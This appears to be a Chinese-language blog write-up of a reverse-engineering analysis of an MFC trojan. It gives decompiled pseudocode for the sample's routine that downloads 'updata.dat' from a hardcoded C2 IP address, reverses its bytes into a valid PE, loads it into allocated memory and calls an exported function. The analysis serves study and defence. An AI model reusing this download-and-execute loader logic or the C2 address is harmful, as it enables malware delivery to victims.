---
layout: post
title: "[reverse] 记一次木马分析"
---

#### 0x00 前言

获得一个样本，简单了解为MFC的程序，以下是分析过程的一些总结，目的是为了了解这个程序到底做了什么。

第一次分析确实很乱，主要由于没有分析出程序的主功能，而且大部分的功能操作都是通过读取远程服务器的那个文件内容来操作。

#### 0x01 流程分析 ####

AfxWinMain ---> initinstance ---> domodal ---> AfxDlgProc ---> OnInitDialog ---> trojan_download

trojan_download函数执行流程：

伪代码：

	trojan_download(CDialog *this) {
		typedef DWORD (CALLBACK *LPFNREGISTER)(DWORD,DWORD);
		char *FileName = "C:/Program Files/Internet Explorer";
		char *LibFileName = "/updata.exe";
		strconcat(FileName, LibFileName);
		if (GetFileAttributesA(&FileName) == -1) {
			HMODULE hModule = LoadLibraryA("urlmon.dll");
			LPFNREGISTER lpfnRegister = GetProcAddress(hModule, "URLDownloadToFileA");
			char *Trojan = "http://121.14.212.211:800/updata.dat";
			URLDownloadToFileA(0, Trojan, FileName, 0, 0);
			sub_402320(FileName);
		} else {
			HANDLE hOpenfile = CreateFileA(lpFileName, 
							FILE_FLAG_WRITE_THROUGH,
							0,
							0,
							3u,
							0x80u,
							0);
			result = sub_402260(hOpenfile, "SSSSSSVID");
			if ( result && !strcmp(result+0xa, "2018-V1"))   // 文件头部偏移0xa是否为2018-V1
				sub_402320(fOpenfile);		// 加载updata.exe
		}
	}

sub_402320伪代码：

	sub_402320(const char * filename) {
		char *lpFileName = filename;
		while(1) {
			HANDLE hOpenfile = CreateFileA(lpFileName, 
							FILE_FLAG_WRITE_THROUGH,
							0,
							0,
							3u,
							0x80u,
							0);
			DWORD dwFilesize = GetFileSize(hOpenfile, 0);
			char *LibFileName = "KERNEL.dll";
			char *ProcName = "VirtualAlloc";
			HMODULE hModuleKernel = LoadLibraryA(LibFileName);
			LPFNREGISTER lp = GetProcAddress(hModuleKernel, ProcName);
			void *pMem = lp(0, dwFileSize, MEM_RESERVE|MEM_COMMIT, 4);
			ReadFile( hOpenfile, pMem, dwFileSize, &NumberOfBytesRead, 0);
			CloseHandle(hOpenfile);
			rever_file_content((char *)pMem, dwFilesize);  // 将头尾的数据进行一次替换
			// heap_buff为一个20字节的数组，index0:updataPEbuff index1:updatabuff index2:0 index3:0 index4:0
			// updata文件的偏移为*(PE+0x28)是一个函数指针，参数为updata, 1, 0;最后更新heap_buff[4]为1
			// updatabuff中偏移为(PE+0x34)存放updatabuff地址
			heap_buff = sub_401B90((int)pMem);
			if (heap_buff) {
				char *string = "updata";
				result = sub_401DB0(heap_buff, string);
				if (result) break;
			}
		}
		result("aPi99pfwFrwvqd9");
		sub_401870((int)heap_buff);   // 释放heap_buff,并执行updata中的函数指针
	}

sub_401DB0的大致功能： 

首先判断updatabuff偏移为(PE+0x7c)是否非0， 在updatabuff偏移为\*(PE+0x78)+0x18和\*(PE+0x78)+0x14非0，最后返回的是updatabuff偏移为\*(\*(PE+0x78+0x1C)+4 \* (\*(PE+0x78+0x24))+updatabuffer),返回的这个这个值为一个函数指针。

该函数指针会接受参数 aPi99pfwFrwvqd9 ,

sub_401DB0伪代码：

<pre>int __cdecl sub_401DB0(int heap_buff, int updata)
{
  int _heap_buff; // eax@1
  int updataimage1; // ebp@1
  _DWORD *updata_PE_78_OFFSET; // edi@1
  int result; // eax@2
  int v6; // edi@3
  _DWORD *v7; // ebx@5
  _WORD *v8; // ebp@5
  unsigned int v9; // ebx@8
  int v10; // [sp+8h] [bp-8h]@5
  int updataimage2; // [sp+14h] [bp+4h]@1

  _heap_buff = heap_buff;
  updataimage1 = *(_DWORD *)(heap_buff + 4);
  updataimage2 = *(_DWORD *)(heap_buff + 4);
  updata_PE_78_OFFSET = (_DWORD *)(*(_DWORD *)_heap_buff + 0x78);
  if ( *(_DWORD *)(*(_DWORD *)_heap_buff + 0x7C) )
  {
    v6 = updataimage1 + *updata_PE_78_OFFSET;
    if ( *(_DWORD *)(v6 + 0x18) && *(_DWORD *)(v6 + 0x14) )
    {
      Sleep(0);
      Sleep(0);
      v7 = (_DWORD *)(updataimage1 + *(_DWORD *)(v6 + 0x20));
      v8 = (_WORD *)(updataimage2 + *(_DWORD *)(v6 + 0x24));
      v10 = 0;
      if ( *(_DWORD *)(v6 + 0x18) )
      {
        while ( sub_401110(updata, (_BYTE *)(updataimage2 + *v7)) )
        {
          ++v7;
          ++v8;
          if ( (unsigned int)++v10 >= *(_DWORD *)(v6 + 24) )
            goto LABEL_8;
        }
        v9 = *v8;
      }
      else
      {
LABEL_8:
        v9 = -1;
      }
      if ( v9 != -1 && v9 <= *(_DWORD *)(v6 + 20) )
      {
        Sleep(0);
        Sleep(0);
        result = updataimage2 + *(_DWORD *)(*(_DWORD *)(v6 + 0x1C) + 4 * v9 + updataimage2);
      }
      else
      {
        result = 0;
      }
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}</pre>

`sub_401870`的大致功能：

主要是回收之前分配的`heap_buff`,并在收回之前会重新执行`updata`文件的偏移为`*(PE+0x28)`是一个函数指针。




`sub_402260`函数的功能：

通过`readfile`将`updata.exe`的内容写入到内存中，并且通过`normalPEfile_402170`整理传入到内存中的数据(由于头尾数据已经被相互替换)。再通过`sub_4021D0`(判断文件开头是否有`SSSSSSVID`，有的话返回跳过的值，无的话返回0)，通过`qmemcpy`将`updata.exe`的文件的头`0x32`个字节写入到内存地址`42c764`.最后返回`42c764`。

`sub_402260`伪代码：

<pre>void *__cdecl sub_402260(HANDLE hFile, int a2)
{
  void *result; // eax@1
  int v3; // esi@1
  void *v4; // ebx@2
  signed int v5; // esi@2
  DWORD NumberOfBytesRead; // [sp+8h] [bp-4h]@1

  NumberOfBytesRead = 0;
  result = (void *)GetFileSize(hFile, 0);
  v3 = (int)result;
  if ( result ) {
    v4 = operator new[]((unsigned int)result);
	ReadFile(hFile, v4, v3, &NumberOfBytesRead, 0);
	normalPEfile_402170((char *)v4, v3);
	v5 = sub_4021D0((int)v4, (const char *)a2, v3, 0);
	if ( v5 == -1 ) {
  		operator delete(v4);
  		result = 0;
	}
	else {
  		qmemcpy(&unk_42C764, (char *)v4 + v5, 0x32u);
  		operator delete(v4);
  		result = &unk_42C764;
	}
  }
  return result;
}</pre>

normalPEfile_402170伪代码：

<pre>void normalPEfile_402170(char *file, int filesize)
{
  char *lpfile = file;
  char *lpfile_tail = &file[filesize - 1];
  if ( file != lpfile_tail )
  {
    do
    {
      char ch = *lpfile;
      *lpfile = *lpfile_tail;
      *lpfile_tail = ch;
      ++lpfile;
      if ( lpfile == lpfile_tail )
        break;
      --lpfile_tail;
    }
    while ( lpfile != lpfile_tail );
  }
}</pre>

ps: 由于篇幅的原因故很多代码都省略了. 

第一次分析可能有些乱，而且这个样本很多操作都是直接通过对PE文件的头部进行操作，包括存地址，存标记，读取偏移量再基于偏移量进行地址读取等等，分析起来确实费力，最终还由于远程服务器已经没有`updata.dat`所以分析也不完整，不知道这个程序的后续是否还有其他操作

#### 0x02 总结:

在`oninitdialog`中运行的主要功能是初始化,从C&C服务上下载`updata.data`保存到本地的`C:/Program Files/Internet explore/updata.exe`，将该文件的内容写入到分配的内存空间中，经过算法处理后，运行`sub_401DB0`返回的函数指针，参数为`aPi99pfwFrwvqd9`. 最后清理申请的所有内存。

中间有2个细节感觉很有意思：

第一. 远程下载到本地的文件，并不是一个有效的PE程序(通过在内存中使用`normalPEfile_402170`程序恢复成有效的PE文件)

第二. 文件内容的所有处理过程都是通过新申请内存来操作，包括最后的执行也是在进程空间中，最后退出时撤销所有申请的内存

目前无法确认后续是否还有其他操作，看virustotal上的分析应该还有文件的增加/删除的操作，但由于服务器上的文件已经删除，导致程序在动态调试时造成异常无法进行后续分析。

#### 0x03 收获： ####

重新熟悉了od,ida等工具的使用以及汇编代码,了解了MFC的一些基本的运行流程,但是对于消息响应的机制没有深入研究，因为该木马只有在初始化的时候进行了功能执行。
